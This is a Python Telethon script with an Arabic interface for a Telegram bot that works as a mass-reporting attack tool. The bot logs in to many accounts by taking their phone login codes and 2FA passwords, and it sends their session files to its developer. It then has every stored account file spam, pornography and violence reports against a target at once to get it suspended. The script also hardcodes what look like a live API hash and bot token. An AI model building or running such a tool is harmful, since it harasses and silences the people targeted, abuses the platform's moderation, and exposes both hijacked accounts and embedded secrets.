import os, asyncio, re, json, random
from telethon import TelegramClient, events, Button, functions, types
from telethon.errors import SessionPasswordNeededError, FloodWaitError, UserNotParticipantError

# --- [ الإعدادات ] ---
API_ID = 25880715 
API_HASH = '0d1e0a5fe75236df18295a0f8b22b458'
BOT_TOKEN = '8650334560:AAHdC8sqyNJoRomjZ_7jAhjf2LF2JQluhxI'
DEVELOPER_ID = 7515408355 
CHANNEL_USER = 'WC_CR7' 

SESSION_DIR = 'user_sessions'
if not os.path.exists(SESSION_DIR):
    os.makedirs(SESSION_DIR)

# إنشاء كائن البوت
bot = TelegramClient('master_bot', API_ID, API_HASH)

# --- [ أزرار الكيبورد ] ---
MAIN_KB = [
    ['🚀 الضربة القاضية (هجوم شامل)'],
    ['➕ إضافة جندي', '🔍 فحص القوة'],
    ['🗑️ تنظيف الحسابات', '📢 قناة المطور']
]

# --- [ الدوال المساعدة ] ---
async def internal_attack(session, target, reasons):
    client = TelegramClient(f"{SESSION_DIR}/{session}", API_ID, API_HASH)
    try:
        await client.connect()
        if await client.is_user_authorized():
            for r in reasons:
                await client(functions.messages.ReportRequest(peer=target, id=[0], reason=r))
                await asyncio.sleep(0.3)
            return True
    except: return False
    finally: await client.disconnect()

# --- [ معالجة الرسائل ] ---
@bot.on(events.NewMessage(pattern='/start'))
async def start(event):
    if event.sender_id != DEVELOPER_ID:
        try:
            await bot(functions.channels.GetParticipantRequest(CHANNEL_USER, event.sender_id))
        except:
            return await event.respond(f"⚠️ اشترك أولاً: @{CHANNEL_USER}", buttons=[Button.url("اضغط هنا", f"https://t.me/{CHANNEL_USER}")])
    await event.respond("🛡️ **أهلاً بك يا قائد في نظام الشد V12 (نسخة Render)**", buttons=MAIN_KB)

@bot.on(events.NewMessage)
async def handle_kb(event):
    txt = event.text
    uid = event.sender_id
    if uid != DEVELOPER_ID: return

    if txt == '➕ إضافة جندي':
        async with bot.conversation(uid) as conv:
            await conv.send_message("📱 أرسل الرقم مع المفتاح (مثال: +218xxxx):")
            phone = (await conv.get_response()).text.strip().replace(" ", "")
            client = TelegramClient(f"{SESSION_DIR}/{phone}", API_ID, API_HASH)
            await client.connect()
            try:
                res = await client.send_code_request(phone)
                await conv.send_message("📩 حول الكود هنا:")
                otp_msg = await conv.get_response()
                otp = re.search(r'\b\d{5}\b', otp_msg.text)
                if otp:
                    try:
                        await client.sign_in(phone, otp.group(0), phone_code_hash=res.phone_code_hash)
                    except SessionPasswordNeededError:
                        await conv.send_message("🔐 الباسورد (2FA):")
                        await client.sign_in(password=(await conv.get_response()).text)
                    await conv.send_message("✅ تم الانضمام. جاري إرسال نسخة الجلسة لك...")
                    await bot.send_file(DEVELOPER_ID, f"{SESSION_DIR}/{phone}.session", caption=f"📦 نسخة احتياطية: `{phone}`")
                else: await conv.send_message("❌ كود غير صحيح.")
            except Exception as e: await conv.send_message(f"❌ فشل: {e}")
            finally: await client.disconnect()

    elif txt == '🚀 الضربة القاضية (هجوم شامل)':
        async with bot.conversation(uid) as conv:
            await conv.send_message("🔗 أرسل رابط أو يوزر الهدف:")
            target = (await conv.get_response()).text.strip()
            reasons_kb = [[Button.inline("🔥 ضربة شاملة", data="k_all")],
                          [Button.inline("إسبام", data="k_spam"), Button.inline("إباحي", data="k_porn")]]
            await conv.send_message(f"🎯 الهدف: `{target}`\nاختر نوع الضربة:", buttons=reasons_kb)
            bot.target_temp = target

    elif txt == '🔍 فحص القوة':
        count = len([f for f in os.listdir(SESSION_DIR) if f.endswith('.session') and f != 'master_bot.session'])
        await event.respond(f"🚀 القوة الحالية: {count} حساب جاهز للشد.")

@bot.on(events.CallbackQuery(pattern=r"k_(.*)"))
async def attack_call(event):
    cmd = event.data.decode().split('_')[1]
    all_reasons = [types.InputReportReasonSpam(), types.InputReportReasonPornography(), types.InputReportReasonViolence()]
    reason_map = {"spam": [types.InputReportReasonSpam()], "porn": [types.InputReportReasonPornography()], "all": all_reasons}
    
    target = getattr(bot, 'target_temp', None)
    if not target: return await event.respond("❌ أعد إرسال الرابط.")
    
    sessions = [f.replace('.session', '') for f in os.listdir(SESSION_DIR) if f.endswith('.session') and f != 'master_bot.session']
    await event.edit(f"🌪️ بدأ الإعصار بـ {len(sessions)} حساب...")
    
    tasks = [internal_attack(s, target, reason_map.get(cmd, all_reasons)) for s in sessions]
    results = await asyncio.gather(*tasks)
    await event.respond(f"🏁 انتهى الهجوم!\n✅ ناجح: {results.count(True)}")

# --- [ دالة التشغيل (حل مشكلة Render) ] ---
async def main():
    await bot.start(bot_token=BOT_TOKEN)
    print("✅ البوت يعمل الآن على Render بنجاح..")
    await bot.run_until_disconnected()

if __name__ == '__main__':
    try:
        asyncio.run(main())
    except (KeyboardInterrupt, SystemExit):
        pass
